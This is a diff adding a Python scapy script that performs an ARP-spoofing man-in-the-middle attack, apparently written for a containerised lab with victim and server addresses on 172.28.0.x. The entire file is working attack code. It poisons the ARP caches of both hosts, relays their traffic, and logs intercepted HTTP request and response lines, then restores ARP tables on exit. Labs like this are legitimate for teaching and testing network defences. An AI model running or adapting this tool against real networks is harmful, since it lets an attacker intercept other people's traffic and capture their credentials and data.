@@ -1,0 +1,186 @@
+import os
+import signal
+import sys
+import threading
+import time
+from pathlib import Path
+from typing import Optional
+
+from scapy.all import (  # type: ignore[import-not-found]
+    ARP,
+    Ether,
+    IP,
+    Raw,
+    TCP,
+    conf,
+    get_if_hwaddr,
+    sendp,
+    sniff,
+    srp,
+)
+
+VICTIM_IP = os.environ.get("VICTIM_IP", "172.28.0.20")
+SERVER_IP = os.environ.get("SERVER_IP", "172.28.0.10")
+INTERFACE = os.environ.get("ATTACK_INTERFACE", conf.iface)
+
+POISON_INTERVAL = float(os.environ.get("POISON_INTERVAL", "2"))
+LOG_PREFIX = "[ATTACKER]"
+
+stop_event = threading.Event()
+
+
+def log(message: str) -> None:
+    print(f"{LOG_PREFIX} {message}", flush=True)
+
+
+def enable_ip_forwarding() -> None:
+    try:
+        Path("/proc/sys/net/ipv4/ip_forward").write_text("1", encoding="ascii")
+        log("enabled IPv4 forwarding")
+    except OSError as exc:
+        log(f"failed to enable ip_forward ({exc}); continuing with user-space forwarding")
+
+
+def resolve_mac(target_ip: str, iface: str) -> str:
+    log(f"resolving MAC address for {target_ip}")
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
+    answered, _ = srp(packet, timeout=2, retry=3, iface=iface, verbose=0)
+    for _, response in answered:
+        mac = response[Ether].src
+        log(f"MAC for {target_ip} is {mac}")
+        return mac
+    raise RuntimeError(f"Could not resolve MAC address for {target_ip}")
+
+
+def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    log("starting ARP poisoning loop")
+    frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
+        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=attacker_mac
+    )
+    frame_to_server = Ether(dst=server_mac, src=attacker_mac) / ARP(
+        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=attacker_mac
+    )
+    while not stop_event.is_set():
+        sendp(frame_to_victim, verbose=0, iface=INTERFACE)
+        sendp(frame_to_server, verbose=0, iface=INTERFACE)
+        time.sleep(POISON_INTERVAL)
+    log("ARP poisoning loop stopped")
+
+
+def restore_arp(victim_mac: str, server_mac: str) -> None:
+    log("restoring ARP tables")
+    sendp(
+        Ether(dst=victim_mac, src=server_mac)
+        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=server_mac),
+        count=5,
+        inter=0.2,
+        verbose=0,
+        iface=INTERFACE,
+    )
+    sendp(
+        Ether(dst=server_mac, src=victim_mac)
+        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=victim_mac),
+        count=5,
+        inter=0.2,
+        verbose=0,
+        iface=INTERFACE,
+    )
+
+
+def describe_payload(payload: bytes) -> str:
+    text = payload.decode("utf-8", errors="replace")
+    first_line = text.splitlines()[0] if text else ""
+    return first_line[:120]
+
+
+def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    if IP not in packet or Ether not in packet:
+        return
+    if packet[Ether].src == attacker_mac:
+        return
+
+    direction: Optional[str] = None
+    dst_mac: Optional[str] = None
+    if packet[IP].src == VICTIM_IP and packet[IP].dst == SERVER_IP:
+        direction = "victim->server"
+        dst_mac = server_mac
+    elif packet[IP].src == SERVER_IP and packet[IP].dst == VICTIM_IP:
+        direction = "server->victim"
+        dst_mac = victim_mac
+
+    if not direction or not dst_mac:
+        return
+
+    if Raw in packet and packet.haslayer(TCP):
+        if direction == "victim->server" and packet[TCP].dport == 80:
+            payload_preview = describe_payload(packet[Raw].load)
+            log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")
+        elif direction == "server->victim" and packet[TCP].sport == 80:
+            payload_preview = describe_payload(packet[Raw].load)
+            log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")
+
+    new_packet = Ether(src=attacker_mac, dst=dst_mac) / packet[IP]
+    sendp(new_packet, iface=INTERFACE, verbose=0)
+
+
+def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    log("starting packet sniffer")
+
+    def handler(pkt):
+        forward_packet(pkt, victim_mac, server_mac, attacker_mac)
+
+    sniff(
+        iface=INTERFACE,
+        prn=handler,
+        store=False,
+        stop_filter=lambda _: stop_event.is_set(),
+        filter=f"ip host {VICTIM_IP} and ip host {SERVER_IP}",
+    )
+
+
+def handle_signals(victim_mac: str, server_mac: str) -> None:
+    def _handler(signum, _frame):
+        log(f"received signal {signum}, stopping")
+        stop_event.set()
+        restore_arp(victim_mac, server_mac)
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, _handler)
+    signal.signal(signal.SIGTERM, _handler)
+
+
+def main() -> None:
+    conf.iface = INTERFACE
+    conf.verb = 0
+
+    log("attacker container booting")
+    log(f"using interface {INTERFACE}")
+
+    enable_ip_forwarding()
+
+    attacker_mac = get_if_hwaddr(INTERFACE)
+    log(f"attacker MAC is {attacker_mac}")
+
+    victim_mac = resolve_mac(VICTIM_IP, INTERFACE)
+    server_mac = resolve_mac(SERVER_IP, INTERFACE)
+
+    handle_signals(victim_mac, server_mac)
+
+    poison_thread = threading.Thread(
+        target=poison_arp, args=(victim_mac, server_mac, attacker_mac), daemon=True
+    )
+    poison_thread.start()
+
+    try:
+        sniff_packets(victim_mac, server_mac, attacker_mac)
+    except Exception as exc:  # noqa: BLE001
+        log(f"sniffer exception: {exc}")
+    finally:
+        stop_event.set()
+        poison_thread.join(timeout=1)
+        restore_arp(victim_mac, server_mac)
+        log("exiting cleanly")
+
+
+if __name__ == "__main__":
+    main()
